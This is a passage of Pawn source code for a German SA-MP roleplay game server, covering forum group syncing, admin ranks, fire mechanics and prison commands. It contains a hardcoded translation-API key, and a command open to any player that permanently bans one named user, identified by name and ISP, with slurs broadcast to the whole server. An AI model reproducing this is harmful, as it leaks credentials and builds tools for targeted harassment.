		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "23");
		return 1;
	}
    if(oldrang == 13 && rang == 13)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "24");
		return 1;
	}
    if(oldrang == 14 && rang == 14)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "25");
		return 1;
	}
    if(oldrang == 15 && rang == 15)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "26");
		return 1;
	}
    if(oldrang == 16 && rang == 16)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "27");
		return 1;
	}
    if(oldrang == 17 && rang == 17)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "28");
		return 1;
	}
    if(oldrang == 18 && rang == 18)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "29");
		return 1;
	}
    if(oldrang == 19 && rang == 18)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "30");
		return 1;
	}
    if(oldrang == 20 && rang == 20)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "31");
		return 1;
	}
    if(oldrang == 21 && rang == 21)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "32");
		return 1;
	}
    if(oldrang == 22 && rang == 22)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "33");
		return 1;
	}
    if(oldrang == 23 && rang == 23)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "34");
		return 1;
	}
    if(oldrang == 24 && rang == 24)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "35");
		return 1;
	}
    if(rang == 0)// 12 - 35
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35");
	}
    if(oldrang == 1)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "12");
	}
    if(oldrang == 2)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "13");
	}
    if(oldrang == 3)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "14");
	}
    if(oldrang == 4)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "15");
	}
    if(oldrang == 5)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "16");
	}
    if(oldrang == 6)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "17");
	}
    if(oldrang == 7)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "18");
	}
    if(oldrang == 8)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "19");
	}
    if(oldrang == 9)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "20");
	}
    if(oldrang == 10)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "21");
	}
    if(oldrang == 11)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "22");
	}
    if(oldrang == 12)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "23");
	}
    if(oldrang == 13)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "24");
	}
    if(oldrang == 14)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "25");
	}
    if(oldrang == 15)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "26");
	}
    if(oldrang == 16)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "27");
	}
    if(oldrang == 17)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "28");
	}
    if(oldrang == 18)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "29");
	}
    if(oldrang == 19)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "30");
	}
    if(oldrang == 20)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "31");
	}
    if(oldrang == 21)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "32");
	}
    if(oldrang == 22)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "33");
	}
    if(oldrang == 23)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "34");
	}
    if(oldrang == 24)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "35");
	}
    if(rang == 1)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "12");
	}
    if(rang == 2)
    {
		printf("WBB_AddToGroups Frak 2");  //-> The number is 42.
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "13");
	}
    if(rang == 3)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "14");
	}
    if(rang == 4)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "15");
	}
    if(rang == 5)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "16");
	}
    if(rang == 6)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "17");
	}
    if(rang == 7)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "18");
	}
    if(rang == 8)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "19");
	}
    if(rang == 9)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "20");
	}
    if(rang == 10)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "21");
	}
    if(rang == 11)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "22");
	}
    if(rang == 12)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "23");
	}
    if(rang == 13)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "24");
	}
    if(rang == 14)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "25");
	}
    if(rang == 15)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "26");
	}
    if(rang == 16)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "27");
	}
    if(rang == 17)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "28");
	}
    if(rang == 18)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "29");
	}
    if(rang == 19)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "30");
	}
    if(rang == 20)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "31");
	}
    if(rang == 21)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "32");
	}
    if(rang == 22)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "33");
	}
    if(rang == 23)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "34");
	}
    if(rang == 24)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "35");
	}
	return 1;
}


stock GetPlayerAdminName(playerid)
{
    						new getadminname[128];
                            if(PlayerInfo[playerid][pAdmin] == 2)
                            {
                                getadminname = "Communityhelfer";
                            }
                            else if(PlayerInfo[playerid][pAdmin] == 4)
                            {
                                getadminname = "Supporter";
                            }
                            else if(PlayerInfo[playerid][pAdmin] == 1337)
                            {
                                getadminname = "Moderator";
                            }
                            else if(PlayerInfo[playerid][pAdmin] == 1338)
                            {
                                getadminname = "Admin";
                            }
                            else if(PlayerInfo[playerid][pAdmin] == 2000)
                            {
                                getadminname = "Head-Admin";
                            }
                            else if(PlayerInfo[playerid][pAdmin] == 2001)
                            {
                                getadminname = "Stellv. Projektleitung";
                            }
                            else if(PlayerInfo[playerid][pAdmin] == 2002)
                            {
                                getadminname = "Projektleitung";
                            }
                            else if(PlayerInfo[playerid][pAdmin] == 2006)
                            {
                                getadminname = "UC-Admin";
                            }
							return getadminname;
}




// Funktion
forward vehicleWarnlight(vehicleid);
public vehicleWarnlight(vehicleid) // VehicleID kommt aus der Hauptfunktion "/warnblinker"
{
	if(switcher[vehicleid] == 0) // Funktionsinterner Switcher
	{
	    // Objekte werden erstellt
		objekt1[vehicleid] = CreateObject(19294,0,0,0,0,0,0);
 		objekt2[vehicleid] = CreateObject(19294,0,0,0,0,0,0);
  		objekt3[vehicleid] = CreateObject(19294,0,0,0,0,0,0);
   		objekt4[vehicleid] = CreateObject(19294,0,0,0,0,0,0);

   		// Objekte werden an das Auto geheftet.
   		/*
   		    Die -0.65 beschreibt die X-Achse des Autos
   		    Die 2.55 bzw -2.6 die Y-Achse des Autos
   		    Im Koordinatensystem beschreibt dies die Draufsicht auf das Auto
   		*/
   		AttachObjectToVehicle(objekt1[vehicleid], vehicleid, -0.65, 2.55, 0, 0.0, 0.0, 0.0); // Vorne links
        AttachObjectToVehicle(objekt2[vehicleid], vehicleid, 0.65, 2.55, 0, 0.0, 0.0, 0.0); // Vorne rechts
        AttachObjectToVehicle(objekt3[vehicleid], vehicleid, -0.65, -2.6, 0, 0.0, 0.0, 0.0); // Hinten links
		AttachObjectToVehicle(objekt4[vehicleid], vehicleid, 0.65, -2.6, 0, 0.0, 0.0, 0.0); // Hinten rechts

		switcher[vehicleid] = 1;// Der Switcher wird umgeschaltet
	}
	else
	{
	    DestroyObject(objekt1[vehicleid]);// Objekte am Auto werden gelöscht
 	    DestroyObject(objekt2[vehicleid]);
 	    DestroyObject(objekt3[vehicleid]);
	    DestroyObject(objekt4[vehicleid]);

		switcher[vehicleid] = 0;// Der Switcher wird umgeschaltet
	}
}



public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{


//	printf("%f %f %f %d", fX,fY,fZ,GetPlayerVirtualWorld(playerid));
//	AddFire(fX,fY,fZ,GetPlayerVirtualWorld(playerid),true);





	if(hittype == 2) // Funktionsinterner Switcher
	{

		if(IsADtCar(hitid))// Privatfahrzeug
	   	{

			new carowner = GetDtCarOwner(hitid);
		    new slot = GetDtCarOwnerSlot(carowner,hitid);
			if(PlayerCar[carowner][slot][LPG] == 1)
			{


         	    new Float:vehx, Float:vehy, Float:vehz;
        	    GetVehiclePos(hitid, vehx, vehy, vehz);

				CreateExplosion(vehx, vehy, vehz, 3, 25.5);

				for(new i=0; i<MAX_PLAYERS; i++)
				{
					if(IsPlayerInRangeOfPoint(i, 30, vehx, vehy, vehz))
					{
						GameTextForPlayer(i, "LPG-Explosion", 5000, 3);
					}
				}

			}
		}
	}
    return 1;
}








stock ReturnColor(const color) // from Y_Less
{
	new str[32];
	format(str, sizeof(str), "{%06x}", color);
	return str;
}









forward pWBB4_Callback(action, index, playerid, status, response[]);
public pWBB4_Callback(action, index, playerid, status, response[])
{


	if ( action == pWBB4_ACTION_WBBGETUSERID && index == playerid )
    {





        if ( status == 1 )
   		{

   			PlayerInfo[playerid][ForumID] = strval(response);
        }
  		else
  		{
        PlayerInfo[playerid][ForumID] = -1;
        printf("Der Benutzername '%s' ist ungültig.", response);
        }
    }
    return 1;
}
stock SetPlayerPrisonCP(playerid){
    new rnd = random(sizeof(PrisonCPs));
    PrisonCoords[playerid][0] = PrisonCPs[rnd][0];
    PrisonCoords[playerid][1] = PrisonCPs[rnd][1];
    PrisonCoords[playerid][2] = PrisonCPs[rnd][2];
    SetPlayerCheckpoint(playerid, PrisonCPs[rnd][0], PrisonCPs[rnd][1], PrisonCPs[rnd][2], 2.5);
    return 1;
}












ocmd:checkpointprison(playerid, params[]){
    new id, cps, string[128], reason[64];
    if(PlayerInfo[playerid][pAdmin] < 1)return SendClientMessage(playerid, COLOR_RED, "Du bist kein Admin"); //<--- Die Abfragen anpassen!
    if(sscanf(params, "uis", id, cps, reason))return SendClientMessage(playerid, COLOR_GREY, "/prison [Name / ID] [Checkpoints] [Grund]");
    if(PlayerInfo[id][pAdmin] > 0)return SendClientMessage(playerid, COLOR_RED, "Du kannst keinen Admin ins Prison stecken!"); //<--- Die Abfragen anpassen!
    PlayerInfo[id][pPrisonCPs] = cps; //<-- Musst du anpassen
    SpawnPlayer(id); //<-- Musst du anpassen
    format(string, sizeof(string), "* Du wurdest von %s für %i Checkpoints ins Prison gesteckt. Grund: %s ", GetName(playerid), cps, reason);
    SendClientMessage(id, COLOR_WHITE, string);
    format(string, sizeof(string), "Du hast %s für %i Checkpoints ins Prison gesteckt. Grund: %s", GetName(id), cps, reason);
    SendClientMessage(playerid, COLOR_WHITE, string);
    format(string, sizeof(string), "[Admin] %s wurde von %s für %i Checkpoints ins Prison gesteckt. Grund: %s", GetName(id), GetName(playerid), cps, reason);
    SendClientMessageToAll(-1, string);
    SendClientMessage(id, COLOR_WHITE,"Mit {FF0000}/prisoncps{FFFFFF} kannst du deine verbleibenden Checkpoints sehen.");
    AntiAdminAbuse[playerid]++;

//    udb_hash
    return 1;
}



ocmd:prisoncps(playerid, params[]){
    TextDrawShowForPlayer(playerid,Textdraw5);
    TextDrawShowForPlayer(playerid,Textdraw6);
    TextDrawShowForPlayer(playerid,Textdraw7);
    TextDrawShowForPlayer(playerid,Textdraw8);
    new string[128];
    if(!PlayerInfo[playerid][pPrisonCPs])return SendClientMessage(playerid, COLOR_RED, "Du bist nicht im Prison");
    format(string, sizeof(string), "Du bist noch für %i Checkpoints im Prison", PlayerInfo[playerid][pPrisonCPs]);
    SendClientMessage(playerid, COLOR_GREEN, string);
    return 1;
}


forward WBB_GetUserIDFixed(playerid);
public WBB_GetUserIDFixed(playerid) {
	new buffer[128], postData[128];
	format(postData ,sizeof postData, "&request=wbb_getId&username=%s", GetName(playerid));
	SendWbbApiRequest(postData, buffer, sizeof buffer);
	return strval(buffer);
}

SendWbbApiRequest(PostData[],Result[],Length)
{
	new httpStatus = SynchronizedHTTP (WBB_CONNECT_URL, PostData , Result , Length , HTTP_GET , 5 , true);
	if(httpStatus == 200)
	{
		return true;
	}
	else
	{
		return false;
	}
}
ReturnGPCI(iPlayerID)
{
    new
        szSerial[41]; // 40 + \0

    gpci(iPlayerID, szSerial, sizeof(szSerial));
    return szSerial;
}
Function terrotgate772close()
{
	MoveObject(terrotgate772,664.93164, -1309.73682, 15.22011,2.0);
	return 1;
}
Function terrorgate532close()
{
	MoveObject(terrorgate532,660.07465, -1227.42554, 16.92300,2.0);
	return 1;
}
Function terrorgate631close()
{
	MoveObject(terrorgate631,785.31372, -1152.43372, 25.40322,2.0);
	return 1;
}
Function yakutorclose()
{
	MoveObject(yakutor,2518.82227, 1822.89758, 12.60578,4.0);
	return 1;
}


ocmd:bandenhurensohn(playerid,params[])
{
	if(IsASkrupy(playerid)) return SCM(playerid,-1,"Du bist selbst einer.");

	new skrupy = INVALID_PLAYER_ID;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        if(IsASkrupy(i))
	        {
	            skrupy = i;
			}
		}
	}
	if(skrupy == INVALID_PLAYER_ID) return SCM(playerid,-1,"Auf dem Server wurde kein Skrupy detectet");
	else
	{
	    new string[128];
	    format(string, sizeof(string), "%s hat den Hurensohn Skrupy permanent vom Server weggebannt.", GetName(playerid));
    	SendClientMessageToAll(COLOR_RED, string);


    	PlayerInfo[skrupy][pAdmin] = 0;
		PlayerInfo[skrupy][pGebannt] = 1;


		new stringk[128];
		format(stringk, sizeof(stringk), "Skrupys sind verbotten. Piss dich oder ich schmeis dir\n die prügel raus");
		strmid(PlayerInfo[skrupy][pBanGrund], stringk, 0, strlen(stringk), 255);

		format(stringk, sizeof(stringk), GetName(playerid));
		strmid(PlayerInfo[skrupy][pBanAdmin], stringk, 0, strlen(stringk), 255);

		format(stringk, sizeof(stringk), "Permanent");
		strmid(PlayerInfo[skrupy][pBanDauer], stringk, 0, strlen(stringk), 255);
        SetTimerEx("bantimer", 300,false,"i",skrupy);
    	return 1;
	}
}


stock IsASkrupy(playerid)
{
	new IP[32],countryy[32];

//	GetPlayerIp(playerid, IP, sizeof(IP));

//	GetIPISP(IP, countryy, 32);//GetPlayerIp(giveplayerid,playersip,sizeof(playersip));


    if(strfind(countryy, "EWE Tel", true) != -1)
	{
        if(!strcmp(GetName(playerid), "Skrupy", false))
        {
		return 1;
		}
	}/*
    else if(strfind(countryy, "Deutsche Telekom AG", true) != -1)
	{
        if(!strcmp(GetName(playerid), "Asuna", false))
        {
		return 1;
		}
        if(!strcmp(GetName(playerid), "Mister_Moreno", false))
        {
		return 1;
		}
	}

    else if(strfind(countryy, "Vodafone GmbH", true) != -1)
	{
        if(!strcmp(GetName(playerid), "Tec9", false))
        {
		return 1;
		}
        if(!strcmp(GetName(playerid), "Mister_Moreno", false))
        {
		return 1;
		}
	}

    else if(strfind(countryy, "A1 Telekom Austria AG", true) != -1)
	{
        if(!strcmp(GetName(playerid), "Max_taran", false))
        {
		return 1;
		}
	}*/
	return 0;
}








//------------------------------------------------------------------------------

forward UpdateResponse(playerid, response_code, data[]);
public UpdateResponse(playerid, response_code, data[])
{
    new string[1028];
    if(response_code == 200)
    {
	    if(strfind(data, "ï»¿", true) != -1) strdel(data,0,4);

		new stringLength = strlen(data);

		strdel(data,stringLength-3,stringLength);




        format(string, sizeof(string), "%s sagt: %s", GetName(playerid),data);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		SetPlayerChatBubble(playerid, data, 0xFF2800FF, 70.0, 5000);
    }
    else
    {
        format(string, sizeof(string), "The request failed! The response code was: %d", response_code);
        SendClientMessage(playerid, 0xFFFFFFFF, string);
    }
}

forward UpdateResponseRE(playerid, response_code, data[]);
public UpdateResponseRE(playerid, response_code, data[])
{
    new string[1028];
    if(response_code == 200)
    {
	    if(strfind(data, "ï»¿", true) != -1) strdel(data,0,4);

		new stringLength = strlen(data);

		strdel(data,stringLength-3,stringLength);




        format(string, sizeof(string), "%s sagt: %s", GetName(playerid),data);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		SetPlayerChatBubble(playerid, data, 0xFF2800FF, 70.0, 5000);
    }
    else
    {
        format(string, sizeof(string), "The request failed! The response code was: %d", response_code);
        SendClientMessage(playerid, 0xFFFFFFFF, string);
    }
}

//------------------------------------------------------------------------------
forward UpdateResponseOOC(playerid, response_code, data[]);
public UpdateResponseOOC(playerid, response_code, data[])
{
    new string[1028];
    if(response_code == 200)
    {
		    new Link[1200];
		    format(Link,sizeof(Link),"api.microsofttranslator.com/V2/Ajax.svc/Translate?appId=6635D742380CF583FEE16FF83E80BC8238F166E3&to=de&text=%s",data);
		    for(new c; c < strlen(Link)+1; c++)
		    {
		         if(Link[c] == ' ') Link[c] = '+';

		    }
			HTTP(playerid, HTTP_GET, Link, "", "UpdateResponseOOCRE");
    }
    else
    {
        format(string, sizeof(string), "The request failed! The response code was: %d", response_code);
        SendClientMessage(playerid, 0xFFFFFFFF, string);
    }
}

forward UpdateResponseOOCRE(playerid, response_code, data[]);
public UpdateResponseOOCRE(playerid, response_code, data[])
{
    new string[1028];
    if(response_code == 200)
    {
			    if(strfind(data, "ï»¿", true) != -1) strdel(data,0,4);

				new stringLength = strlen(data);

				strdel(data,stringLength-3,stringLength);

				strdel(data,0,2);







				if(PlayerInfo[playerid][pAdmin] == 2)
				{
					format(string, sizeof(string), "{2179a5}(( * Communityhelfer %s: %s ))", GetName(playerid), data);
				}
				else if(PlayerInfo[playerid][pAdmin] == 4)
				{
					format(string, sizeof(string), "{2179a5}(( * Supporter %s: %s ))", GetName(playerid), data);
				}
				else if(PlayerInfo[playerid][pAdmin] == 1337)
				{
					format(string, sizeof(string), "{2179a5}(( * Moderator %s: %s ))", GetName(playerid), data);
				}
				else if(PlayerInfo[playerid][pAdmin] == 1338)
				{
					format(string, sizeof(string), "{2179a5}(( * Administrator %s: %s ))", GetName(playerid), data);
				}
			    else if(PlayerInfo[playerid][pAdmin] == 2000)
				{
					format(string, sizeof(string), "{2179a5}(( * Head-Admin %s: %s ))", GetName(playerid), data);
				}
				else if(PlayerInfo[playerid][pAdmin] == 2001)
				{
					format(string, sizeof(string), "{2179a5}(( * Stellv. Projektleitung %s: %s ))", GetName(playerid), data);
				}
				else if(PlayerInfo[playerid][pAdmin] == 2002)
				{
					format(string, sizeof(string), "{2179a5}(( * Projektleitung %s: %s ))", GetName(playerid), data);
				}
				else if(PlayerInfo[playerid][pAdmin] >= 2005)
				{
					format(string, sizeof(string), "{2179a5}(( * UC-Admin: %s ))",  data);
				}
				else if(PlayerInfo[playerid][pDonateRank] > 1 && (noooc))
				{
					format(string, sizeof(string), "(( * Premiumuser %s: %s ))", GetName(playerid), data);
				}
				else if(PlayerInfo[playerid][pAdmin] == 0 && (noooc))
				{
				    format(string, sizeof(string), "(( %s: %s ))", GetName(playerid), data);
				}
				else return 1;
				OOCOff(COLOR_OOC,string);
				Log("OA-Chat.txt",string);
    }
    else
    {
        format(string, sizeof(string), "The request failed! The response code was: %d", response_code);
        SendClientMessage(playerid, 0xFFFFFFFF, string);
    }
	return 1;
}
/*
stock SendClientMessage(playerid,color,text)
{

				    new Link[1200];
				    format(Link,sizeof(Link),"api.microsofttranslator.com/V2/Ajax.svc/Translate?appId=6635D742380CF583FEE16FF83E80BC8238F166E3&to=it&text=%s",text);
				    for(new c; c < strlen(Link)+1; c++)
				    {
				         if(Link[c] == ' ') Link[c] = '+';
				    }
					HTTP(playerid, HTTP_GET, Link, "", "UpdateResponseXD");


}



forward UpdateResponseXD(playerid, response_code, data[]);
public UpdateResponseXD(playerid, response_code, data[])
{
    new string[1028];
    if(response_code == 200)
    {
	    if(strfind(data, "ï»¿", true) != -1) strdel(data,0,4);

		new stringLength = strlen(data);

		strdel(data,stringLength,stringLength);

		strdel(data,0,0);

		SendClientMessage(playerid, 0xFFFFFFFF, data);

    }
    else
    {
        format(string, sizeof(string), "The request failed! The response code was: %d", response_code);
        SendClientMessage(playerid, 0xFFFFFFFF, string);
    }
}

*/


/*
stock //PlayerHearMusicInRange(Float:x,Float:y,Float:z,musicid,Float:radius,Takecount,Stopmusictime)//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
{
//	ForEachPlayer(i)
//	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
			if(gPlayerLogged[i] == 1)
			{
				if(IsPlayerInRangeOfPoint(i,radius,x,y,z))
				{
					PlayerPlaySound(i,musicid,0.0,0.0,0.0);
					if(Takecount == 1)
					{
						SetTimerEx("StopPlayerPlaySound",Stopmusictime,0,"i",i);
					}
				}
			}
//		}
	}
	return 1;
}
public StopPlayerPlaySound(playerid)
{
    PlayerPlaySound(playerid,1063,0.0,0.0,0.0);
	PlayerPlaySound(playerid,1069,0.0,0.0,0.0);
	PlayerPlaySound(playerid,1077,0.0,0.0,0.0);
	PlayerPlaySound(playerid,1098,0.0,0.0,0.0);
	PlayerPlaySound(playerid,1166,0.0,0.0,0.0);
	PlayerPlaySound(playerid,1184,0.0,0.0,0.0);
	PlayerPlaySound(playerid,1186,0.0,0.0,0.0);
	PlayerPlaySound(playerid,1188,0.0,0.0,0.0);
	PlayerPlaySound(playerid,1036,0.0,0.0,0.0);
	return 1;
}
*/





stock IsAtFlame(playerid)
{
	for(new i=0;i<MAX_FLAMES;i++)
	{
		if(Flame[i][Flame_Exists])
		{
		  	if(!IsPlayerInAnyVehicle(playerid) && (IsPlayerInRangeOfPoint(playerid,FLAME_ZONE,Flame[i][Flame_x],Flame[i][Flame_y],Flame[i][Flame_z]+Z_DIFFERENCE) ||
			IsPlayerInRangeOfPoint(playerid,FLAME_ZONE,Flame[i][Flame_x],Flame[i][Flame_y],Flame[i][Flame_z]+Z_DIFFERENCE-1)))
		 	{
				return 1;
			}
		}
	}
	return 0;
}
stock AddFire(Float:x,Float:y,Float:z,vworldid,bool:msgbool)
{
	new slot = GetFlameSlot(),string[64];
	if(slot == -1)return slot;
	Flame[slot][Flame_Exists] = 1;
	Flame[slot][Flame_x] = x;
	Flame[slot][Flame_y] = y + 2;
	Flame[slot][Flame_z] = z - Z_DIFFERENCE;
	Flame[slot][Flame_world] = vworldid;
	Flame[slot][Flame_id] = CreateDynamicObject(18689,Flame[slot][Flame_x],Flame[slot][Flame_y],Flame[slot][Flame_z],0.0,0.0,0.0,Flame[slot][Flame_world]);
    if(msgbool == true)
	{
		if((x > -992.5172 && x < 4000.0000) && (y < 528.0000 && y > -4000.0000)) //Los Santos
		{
	    	format(string,sizeof(string),"<< Ein neues Feuer in Los Santos! >>");
		}
		if((x > -4000.0000 && x< -992.5172) && (y < 4000.0000 && y > -4000.0000)) //San Fierro
		{
			format(string,sizeof(string),"<< Ein neues Feuer in San Fierro! >>");
		}
		if((x > -992.5172 && x< 4000.0000) && (y < 4000.0000 && y > 528.0000)) //Las Venturas
		{
	    	format(string,sizeof(string),"<< Ein neues Feuer in Las Venturas! >>");
		}
	}
    ForEachPlayer(i)
	{
		if(IsPlayerConnected(i))
		{
      	    if(PlayerInfo[i][sMember] == 15)
      	    {
//				if(Spieler[i][pDuty] != 0)
//				{
					if(msgbool == true)
					{
						SendClientMessage(i,COLOR_LIGHTRED,string);
					}
					if(slot < 92)
					{
//						SetPlayerMapIcon(i,slot,x,y,z,20,0,MAPICON_GLOBAL);
					}
//			    }
			}
		}
	}
	return slot;
}

public DestroyTheSmokeFromFlame(id)
{
    for(new i;i<5;i++){ DestroyDynamicObject(Flame[id][Smoke][i]); }
}

public FireTimer(playerid,id)
{
//	SendClientMessageToAll(-1, "FireTimer Puplic aufgerufen!");


	if(id < -1 && Aiming_at_Flame(playerid) == id) { StopPlayerBurning(id+MAX_PLAYERS); }
	else if(id < -1 && Pissing_at_Flame(playerid) == id) { StopPlayerBurning(id+MAX_PLAYERS); }
	else if(Flame[id][Flame_Exists] && ((Pressing(playerid) & KEY_FIRE && Aiming_at_Flame(playerid) == id) || (Pissing_at_Flame(playerid) == id)))
	{
		SendClientMessage(playerid,GRUEN,"Du hast einen Brand gelöscht!");
	 	KillFire(id);
	}
	KillTimer(ExtTimer[playerid]);
	ExtTimer[playerid] = -1;
}

public SetPlayerBurn(playerid)
{
//    if(IsPlayerAttachedObjectSlotUsed(playerid,0)) //SendClientMessage(playerid,WANTEDDEATHERROT,"Deine Kopfbedekung ist abgebrannt!"),Spieler[playerid][pBuyClothes] = -1;
    SetPlayerAttachedObject(playerid,0,18690,2,-1,0,-1.9,0,0);
	PlayerOnFire[playerid] = 1;
	KillTimer(PlayerOnFireTimer[playerid]);
	KillTimer(PlayerOnFireTimer2[playerid]);
	PlayerOnFireTimer[playerid] = SetTimerEx("BurningTimer",91,1,"d",playerid);
	PlayerOnFireTimer2[playerid] = SetTimerEx("StopPlayerBurning",7000,0,"d",playerid);
	return 1;
}

public BurningTimer(playerid)
{
	if(PlayerOnFire[playerid] == 1)
	{

    new Float:health;
    GetPlayerHealth(playerid,health);
		SetPlayerHealth(playerid,health-1);
		return 1;
	}
	return KillTimer(PlayerOnFireTimer[playerid]),KillTimer(PlayerOnFireTimer2[playerid]);
}

public StopPlayerBurning(playerid)
{
	KillTimer(PlayerOnFireTimer[playerid]);
	PlayerOnFire[playerid] = 0;
	RemovePlayerAttachedObject(playerid,0);
	return 1;
}

public OnFireUpdate()
{
	ForEachPlayer(playerid)
	{
	 	if(IsPlayerConnected(playerid) && !IsPlayerNPC(playerid))
	  	{
   			if(PlayerOnFire[playerid] && !CanPlayerBurn(playerid,1))
			{ StopPlayerBurning(playerid); }

//			SendClientMessageToAll(-1, "OnFireUpdate 1");
			if(Pissing_at_Flame(playerid) != -1 || Aiming_at_Flame(playerid) != -1)
			{
//				SendClientMessageToAll(-1, "OnFireUpdate 2");
				if(ExtTimer[playerid] == -1 && ((Aiming_at_Flame(playerid) != -1 && Pressing(playerid) & KEY_FIRE) || Pissing_at_Flame(playerid) != -1))
				{
//					SendClientMessageToAll(-1, "OnFireUpdate 3");
					new value,time,Float:x,Float:y,Float:z;
					if(Pissing_at_Flame(playerid) != -1)
				 	{
//			  			SendClientMessageToAll(-1, "OnFireUpdate 4");
						value = Pissing_at_Flame(playerid);
						time = EXTINGUISH_TIME_PEEING;
					}

					else if(Aiming_at_Flame(playerid) != -1)
					{
//						SendClientMessageToAll(-1, "OnFireUpdate 6");
						value = Aiming_at_Flame(playerid);
						if(GetPlayerWeapon(playerid) == 41)
						{
//						SendClientMessageToAll(-1, "OnFireUpdate 7");
						CreateExplosion(Flame[value][Flame_x],Flame[value][Flame_y],Flame[value][Flame_z],2,5);
						continue;
						}
//						SendClientMessageToAll(-1, "OnFireUpdate 8");
						if(IsPlayerInAnyVehicle(playerid))
						{
//							SendClientMessageToAll(-1, "OnFireUpdate 9");
							time = EXTINGUISH_TIME_VEHICLE;
						}
						else
						{
//							SendClientMessageToAll(-1, "OnFireUpdate 10");
							time = EXTINGUISH_TIME_ONFOOT;
						}
					}
//					SendClientMessageToAll(-1, "OnFireUpdate 11");
					if(value < -1) { time = EXTINGUISH_TIME_PLAYER; }
					time *= 1000;
					if(value >= -1)
					{
//						SendClientMessageToAll(-1, "OnFireUpdate 12");
						x = Flame[value][Flame_x];
						y = Flame[value][Flame_y];
						z = Flame[value][Flame_z];
					 	DestroyTheSmokeFromFlame(value);
						Flame[value][Smoke][0] = CreateDynamicObject(18727,x,y,z,0.0,0.0,0.0,Flame[value][Flame_world]);
						Flame[value][Smoke][1] = CreateDynamicObject(18727,x+1,y,z,0.0,0.0,0.0,Flame[value][Flame_world]);
						Flame[value][Smoke][2] = CreateDynamicObject(18727,x-1,y,z,0.0,0.0,0.0,Flame[value][Flame_world]);
						Flame[value][Smoke][3] = CreateDynamicObject(18727,x,y+1,z,0.0,0.0,0.0,Flame[value][Flame_world]);
